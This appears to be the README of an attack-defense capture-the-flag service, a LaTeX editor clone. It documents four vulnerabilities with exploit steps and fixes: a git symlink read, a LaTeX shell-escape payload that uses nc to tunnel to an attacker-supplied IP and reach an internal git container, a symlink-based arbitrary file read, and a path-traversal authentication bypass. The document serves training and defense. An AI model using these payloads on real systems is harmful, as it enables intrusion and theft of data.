# Overview

As the name implies `underleaf` is basically just a clone of `overleaf`.
The service is an online LaTeX editor and compiler.
To use underleaf you have to create an account. Each account can then create multiple projects, with each project containing files that can be edited via a webinterface. The user can than request the service to compile a `.tex` file. Once the server finishes this request the resulting pdf can be downloaded.

Additionaly to the webinterface project fiels may be downloaded via git. A local copy can then be edited and pushed to the service.

Documents are compiled inside of an container. The `https` api of Docker is used to create a container and bind mount the necessary files into it, to then run `pdflatex`.

# Directory structure

```
├── service          # contains the code of the actual service
│  ├── frontend      # contains the vuejs frontend
│  ├── reverseproxy  # contains a nginx.conf that routes inbound traffic to the correct container
│  ├── backend
│  │  └── src
│  │    ├── auth     # contains code for authenticating users
│  │    ├── project  # contains code for managing projects, e.g. creating
│  │    ├── files    # contains code for interaction with project fiels
│  │    ├── git      # contains code for managing the git repository of a
│  │    └── helpers  # contains a wrapper for the docker api and other helpers
│  │
│  ├── dockerimages  # contains the files used to hllm/texlive-thin
│  └── data          # contains the data used by the service, i.e. the projects
└── checker          # contains the code of the checker
  ├── util.py        # provides an api wrapper for the service
  └── checker.py     # implements the methods of the checker, e.g. putflag
```

# Flags

There are two flagstores. Flags are stored:

- inside the `main.tex` of a project, the project id of which is provided as part of the attack info
- inside the name of a project, the name of the user that created this project is provided as part of the attack info

# Vulnerabilities

## Resticted Read

### Description

The git interface can be used to upload a symlink into a project. The endpoint `/api/files/download/:id/*` will follow this symlink read the file, as long as it points to a path in `/app/data/projects`.

### Exploit

- Create an account
- Create a project
- Clone the project to your local machine:

```bash
$ git clone http://127.0.0.1:8080/git/d475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954
Cloning into 'd475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954'...
Username for 'http://127.0.0.1:8080': a
Password for 'http://a@127.0.0.1:8080':
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (3/3), 334 bytes | 334.00 KiB/s, done.
$ cd d475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954/
$ ls -la
total 16
drwxrwxr-x  3 hllm hllm 4096 Jun  1 21:06 .
drwxrwxrwt 23 root root 4096 Jun  1 21:06 ..
drwxrwxr-x  8 hllm hllm 4096 Jun  1 21:06 .git
-rw-rw-r--  1 hllm hllm  216 Jun  1 21:06 main.tex
```

- Create a symlink and push it to the repo

```bash
$ ln -s /app/data/projects/xx/someprojectid/main.tex link
$ git add . && git commit -m "Added symlink to someProject"
$ git push
```

- Pull the changes by clicking on `Pull` in the project view
- Open the `link` now present in the file list

### Fix

The code in `backend/src/files/downloadFile.ts` incorretly checks if the file being downloaded is part of the prject:

```typescript
...
if (await symlinkPathResolvesTo(path, getProjectPath(""))) {
...
```

`symlinkPathResolvesTo` checks if the first argument points to a location, that starts with the second argument. However `getProjectPath` returns the path to a project given its id (e.g. `getProjectPath("abcde") == "/app/dat/projects/ab/abcde"`), but when called with an empty string it will simply return `/app/data/projects//`. Thus this check fails to verify wether a symlink points to a file that is part of this project.

To fix this issue the call to `getProjectPath` needs to be given the projects id.

## Authentication Bypass

## Authentication Bypass

### Description

LaTeX can be used to run code[¹](https://0day.work/hacking-with-latex/), this is a feature of this service, however, this also allows network acces to the `nginx-git` container.
This container itself dose not check for any authentication when cloning a repository.

### Exploit

- Create a project
- Upload a file containing

```tex
\documentclass[12pt]{minimal}
\usepackage{verbatim}
\begin{document}
    \input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; while true; do nc $YOURIPHERE 1234 -e "/usr/bin/nc nginx-git 80\"; done; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
\end{document}
```

When compiled this will result in a connection to `$YOURIPHERE` which is proxied to the `nginx-git` container.

- Run `ncat -lvnp 1234 -ke '/usr/bin/ncat -lvnp 1235` this will listen on port `1235` and forwad the data to a connection recived on port `1234` i.e. the container compiling the document and thus the `nginx-git`.
- Run `while true; do git clone http://127.0.0.1:1235/TARGETPROJECTID && break; done` to continually try and clone the project
- Compile the file

### Fix

A fix for this bug is to disable networking for the containers that compile the documents.

This can be achived by passing `"none"` as the network mode in `execInDocker.ts` to `docker.createContainer`:

```
...
const container = await docker.createContainer(
    image,
    workingDir,
    command,
    "1000:1000",
    "none", // disable networking
    [
      {
        hostPath: hostOutputPath,
        containerPath: containerOutputpath,
        flag: "rw",
      },
      { hostPath: hostReadPath, containerPath: containerReadPath, flag: "ro" },
    ]
  );
...
```

## Abitrary read (Unintended)

### Description

In order to compile a pdf a two directorys are mounted into a container. The project folder itself is mounted as read only, the output directory located in `/app/data/compile/xx/`.

However thus the LaTeX container can also create a symlink in place of the pdf it is suppost to compile.
This symlink is then once again follwed in `getOutput.ts` resulting in the ability to read abitrary files from the backend.

_This vuln allows reading of /cert/client/\* combined with network access to the dind container (e.g. via the second vuln) an attacker may run arbitrary code._

### Exploit

- create an account
- create a project
- upload

```tex
\begin{document}
    \input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d; rm -rf /output/\jobname.pdf; ln -s /app/data/xx/someTargetProject/main.tex /output/\jobname.pdf ; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
\end{document}
```

- open the devtools
- compile the file
- read the content of the file from the request to `/api/latex/output`.

## Authentication bypass (Unintended)

### Description

The reverseproxy handles authenticaion to `/git/*` by sending an `auth_request` to `/api/auth/basic/`. This request contains the original url that was requested inside of the `x-original-url` header.
The the backend uses this url to determin, wether or not the user has access to the project id contained within it.

This check however simply reads the project id by accessing `originalUrl.pathname.split("/")[2]`.

However for a url like `/git/myOwnProject/../someOtherProject` this may not return the projects id.

### Exploit

To exploit this vuln simply clone your "own" project and append `/../$targetId` to the url, e.g.:

```bash
git clone http://username:password@127.0.0.1:4242/git/yourOwnId/../targetId
```
